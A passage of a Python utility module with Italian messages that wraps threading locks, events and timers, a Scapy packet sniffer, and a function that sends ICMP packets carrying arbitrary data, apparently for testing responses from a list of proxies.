            thread_lock.release()
            return response 
        return None 

    def update_thread_response(proxy:ipaddress.IPv4Address=None, thread_lock:threading.Lock=None, thread_response:dict=None, response:bool=False):
        if not (IS_TYPE.ipaddress(proxy) and IS_TYPE.threading_lock(thread_lock) and IS_TYPE.dictionary(thread_response) and IS_TYPE.boolean(response)):  
            raise Exception(f"update_thread_response: argomenti non validi")
        thread_lock.acquire()
        thread_response.update({proxy.compressed:response}) 
        thread_lock.release() 
        
    def setup_thread_foreach_address(address_list:list[ipaddress.IPv4Address]=None,callback_function=None): 
        if IS_TYPE.callable_function(callback_function) and IS_TYPE.list(address_list) and len(address_list)>0: 
            thread_lock=threading.Lock()
            thread_response={}
            thread_list={}
            for proxy in address_list:
                if not IS_TYPE.ipaddress(proxy): 
                    print(f"***\t{proxy} non è un indirizzo valido")
                    continue
                thread=threading.Thread(
                    target=callback_function
                    ,args=[proxy]
                )
                thread.name=f"Thread-{proxy.compressed}"
                thread_list.update({proxy.compressed:thread})
                thread_response.update({proxy.compressed:False}) 
            print(f"Definito il threading lock per quando si accede alle risposte dei proxy") #print(f"Lock creato:\t{thread_lock}")
            print("Definito per ogni proxy il proprio Thread") #print(f"Thread creati:\t{thread_list}")
            print("Definito il dizionario contenente le risposte ricevute dai proxy") #print(f"Risposte create:\t{thread_proxy_response}")
            return thread_lock, thread_response, thread_list 
        raise Exception(f"Impossibile impostare il thread per ciascun proxy")

class THREADING_EVENT():
    def wait(event:threading.Event=None): 
        if not IS_TYPE.threading_Event(event): 
            raise Exception(f"Impossibile aspettare su una variabile non Event") 
        event.wait() 
        event.clear() 
    
    def set(event:threading.Event=None): 
        if not IS_TYPE.threading_Event(event): 
            raise Exception(f"Impossibile settare una variabile non Event") 
        event.set()

#------------------------
class SNIFFER():
    def check_args(args:dict=None): 
        if not IS_TYPE.dictionary(args): 
            raise Exception(f"Gli argomenti passati non sono un dizionario") 
        accepted_key_dict=[
            "iface","filter","prn","store","count", "timeout" ,"lfilter", 
            "opened_socket","session","started_callback","offline","quiet" 
        ]  
        invalid_args=[key for key in args if key not in accepted_key_dict]
        if len(invalid_args)>0: 
            print(f"Argomenti non validi {invalid_args}") 
            return False
        return True 

    def start(sniffer:AsyncSniffer=None, timer:threading.Timer=None): 
        if not (IS_TYPE.AsyncSniffer(sniffer) and IS_TYPE.threading_Timer(timer)): 
            raise Exception(f"SNIFFER.start: Argomenti in input non validi")
        sniffer.start()
        timer.start() 

    def stop(sniffer:AsyncSniffer=None): 
        if IS_TYPE.AsyncSniffer(sniffer): 
            if sniffer.running: 
                print("Fermo lo sniffer.",end=" ") 
                sniffer.stop() 
                if not sniffer.running:
                    print("Sniffer fermato correttamente.") 
                    return True
                print("Sniffer ancora vivo")
            else: 
                raise Exception("Lo sniffer non era in esecuzione")
            return False  
        raise Exception(f"Sniffer non istanza di AsyncSniffer: {type(sniffer)}") 

    def template_timeout(event:threading.Event=None):  
        if not IS_TYPE.threading_Event(event): 
            raise Exception("template_timeout: Argomenti non validi")  
        if not event.is_set():
            print("Timeout: No packet received within 60 seconds") 
            #SNIFFER.stop(sniffer) if sniffer.running else print("Sniffer non in esecuzione")  
            THREADING_EVENT.set(event) 

    def sniff_packet(args:dict=None,timeout_time=60, callback_func_timer=None): 
        if  SNIFFER.check_args(args) and (timeout_time is None or IS_TYPE.time(timeout_time)): 
            sniffer= GET.AsyncSniffer(args) 
            timeout_time=int(timeout_time) if timeout_time is not None else timeout_time  
            if not IS_TYPE.callable_function(callback_func_timer): 
                print("Considera l'utilizzo di 'template_timeout'")
                raise Exception(f"sniff_packet: callback non definita {callback_func_timer}")
            timer = GET.timer(timeout_time, callback_func_timer) 
            SNIFFER.start(sniffer, timer)  
            if sniffer.running:
                print("Lo sniffer è partito")
            else: raise Exception("Lo sniffer non è partito")
            return sniffer, timer 
        raise Exception(f"sniff_packet: Argomenti non validi") 

    def send_packet(data:bytes=None,ip_dst:ipaddress.IPv4Address=None, icmp_seq:int=0,icmp_id:int=None): 
        if not (IS_TYPE.ipaddress(ip_dst) and IS_TYPE.bytes(data) and IS_TYPE.integer(icmp_seq)): 
            raise Exception("send_packet: Argomenti non validi") 
        if not icmp_id or not IS_TYPE.integer(icmp_seq): 
            icmp_id=CALC.checksum(data) 
        pkt = IP(dst=ip_dst.compressed, src=IP_INTERFACE.find_local_IP()[0])/ICMP(id=icmp_id,seq=icmp_seq) / data  
        print(f"Sending {pkt.summary()}") 
        send(pkt, verbose=1, iface=IP_INTERFACE.iface_from_IP(ip_dst)[0]) 

#------------------------
class TIMER(): 
    def stop(timer:threading.Timer=None): 
        if IS_TYPE.threading_Timer(timer): 
            if timer.is_alive(): 
                print("Fermo il timer",end="  ")
                timer.cancel()  
                if not timer.is_alive():
                    print("timer fermato correttamente")
                    return True
                print("Timer ancora in esecuzione")
            else: 
                print("Il timer non era in esecuzione") 
            return False 
        raise Exception(f"Timer non istanza di threadig.Timer: {type(timer)}") 

